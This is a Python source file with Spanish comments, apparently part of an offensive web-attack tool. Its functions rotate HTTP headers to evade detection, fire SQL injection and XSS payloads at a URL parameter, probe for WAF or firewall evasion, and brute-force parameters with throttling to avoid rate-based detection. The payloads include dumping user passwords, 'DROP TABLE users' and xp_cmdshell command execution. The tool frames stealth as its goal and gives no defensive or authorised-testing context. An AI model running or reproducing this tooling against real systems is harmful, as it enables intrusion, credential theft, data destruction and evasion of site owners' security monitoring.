import requests
import random
import string
import time
import re
from termcolor import colored
from colorama import Fore, Style

# ===============================
# MÓDULO: Generador de Headers Stealth
# ===============================
def randomize_headers():
    """Generamos cabeceras HTTP aleatorias para evadir detección"""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0',
        'Mozilla/5.0 (Windows NT 6.1; rv:11.0) like Gecko',
        'Mozilla/5.0 (Linux; Android 10; Pixel 4 XL Build/QD1A.200205.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.67'
    ]
    accept_languages = ['en-US,en;q=0.5', 'es-ES,es;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.7', 'de-DE,de;q=0.9,en;q=0.7']
    accept_encodings = ['gzip, deflate', 'gzip, deflate, br', 'identity']
    referers = ['https://www.google.com/', 'https://www.bing.com/', 'https://www.yahoo.com/', 'https://www.reddit.com/', 'https://www.twitter.com/']

    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept-Language': random.choice(accept_languages),
        'Accept-Encoding': random.choice(accept_encodings),
        'Referer': random.choice(referers),
        'Origin': 'https://www.google.com',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache',
        'TE': 'Trailers'
    }

    return headers


# ===============================
# MÓDULO 5: Fuzzing de parámetros
# ===============================
def fuzzparameter(url):
    """Realizamos fuzzing en los parámetros para encontrar posibles vulnerabilidades"""
    print(colored("[INFO] Realizando fuzzing en los parámetros...", 'yellow'))

    payloads = [
        "' OR 1=1--", "<script>alert('XSS')</script>", "' OR 'a'='a",
        "<img src='x' onerror='alert(1)'>", "' UNION SELECT NULL, username, password FROM users--",
        "' AND 1=1/*", "' OR 1=1#", "<script>confirm('XSS')</script>",
        "'; DROP TABLE users--", "'; EXEC xp_cmdshell('dir')--",
        "'; SELECT * FROM information_schema.tables--", "'; SELECT user, password FROM mysql.user--"
    ]

    error_patterns = ["error", "warning", "syntax", "exception", "fatal", "mysql", "database", "sql", "pma"]
    retries = 3
    timeout = 10

    for payload in payloads:
        test_url = f"{url}?input={payload}"
        attempt = 0

        while attempt < retries:
            try:
                headers = randomize_headers()  # ✅ Usamos encabezados rotativos stealth
                response = requests.get(test_url, headers=headers, timeout=timeout)

                if any(re.search(pattern, response.text, re.IGNORECASE) for pattern in error_patterns):
                    print(colored(f"[VULNERABILIDAD POTENCIAL] En: {test_url}", 'red'))
                    print(colored("[INFO] Respuesta con patrón de error detectado.", 'red'))
                elif "error" in response.text or "warning" in response.text:
                    print(colored(f"[VULNERABILIDAD POTENCIAL] En: {test_url}", 'red'))

                time.sleep(1)
                break

            except requests.exceptions.RequestException as e:
                attempt += 1
                if attempt < retries:
                    print(colored(f"[ERROR] Intento {attempt} fallido. Reintentando... {e}", 'yellow'))
                    time.sleep(2)
                else:
                    print(colored(f"[ERROR] Error al realizar fuzzing: {e}", 'red'))
                    break


# ===============================
# MÓDULO 6: Evasión de detección (WAF/IPS)
# ===============================
def evadedetection(url):
    """Evitamos detección mediante técnicas de evasión avanzadas y análisis de respuesta"""
    headers = randomize_headers()
    proxies = [None]  # Puedes agregar más proxies reales aquí

    try:
        proxy = random.choice(proxies)
        response = requests.get(url, headers=headers, proxies=proxy, timeout=10)
        status = response.status_code
        content = response.text.lower()
        waf_indicators = ["access denied", "forbidden", "not allowed", "security", "blocked", "waf", "firewall"]

        if any(indicator in content for indicator in waf_indicators):
            print(f"{Fore.YELLOW}[!] Posible protección detectada en: {url} (WAF/Firewall){Style.RESET_ALL}")
        elif status == 200:
            print(f"{Fore.GREEN}[+] Conexión exitosa con evasión activa: {url}{Style.RESET_ALL}")
        else:
            print(f"{Fore.CYAN}[*] Respuesta recibida ({status}): {url}{Style.RESET_ALL}")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[-] Error al intentar evadir detección: {e}{Style.RESET_ALL}")


# ===============================
# MÓDULO 7: Fuerza bruta en parámetros
# ===============================
def bruteforcefuzz(url, params, wordlist):
    """Realizamos un ataque de fuerza bruta en parámetros específicos con evasión y análisis"""
    proxies = [None]
    error_indicators = ["error", "warning", "sql", "exception", "not allowed", "denied"]

    for param in params:
        for word in wordlist:
            payload = f"{param}={word}"
            fuzz_url = f"{url}?{payload}"
            headers = randomize_headers()
            proxy = random.choice(proxies)

            try:
                response = requests.get(fuzz_url, headers=headers, proxies=proxy, timeout=10)
                status = response.status_code
                body = response.text.lower()

                if any(error in body for error in error_indicators):
                    print(f"{Fore.YELLOW}[!] Posible vulnerabilidad detectada en: {fuzz_url}{Style.RESET_ALL}")
                elif status == 200:
                    print(f"{Fore.GREEN}[+] Respuesta 200 OK → {fuzz_url}{Style.RESET_ALL}")
                elif status in [403, 401, 406]:
                    print(f"{Fore.RED}[-] Acceso restringido ({status}) → {fuzz_url}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.CYAN}[*] Respuesta ({status}) → {fuzz_url}{Style.RESET_ALL}")

            except requests.exceptions.RequestException as e:
                print(f"{Fore.RED}[-] Error durante fuzzing → {e}{Style.RESET_ALL}")

            time.sleep(0.3)  # Modificalo para evitar detección por velocidad excesiva
